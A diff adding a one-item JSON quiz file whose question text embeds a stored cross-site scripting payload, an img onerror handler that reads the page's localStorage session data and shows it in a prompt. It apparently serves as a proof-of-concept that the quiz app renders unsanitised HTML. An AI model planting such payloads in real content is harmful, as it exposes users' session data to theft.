@@ -1,0 +1,13 @@
+[
+  {
+    "question": "¿Did this prompt something with your session data?<img src=x onerror=\\\"prompt('localStorage (Ctrl+C)',JSON.stringify(localStorage, null, 2))\\\">",
+    "options": [
+      "Yes",
+      "No", 
+      "I do not know",
+      "Use better session management!"
+    ],
+    "correctAnswer": 1,
+    "explanation": "This is a test explanation"
+  }
+]
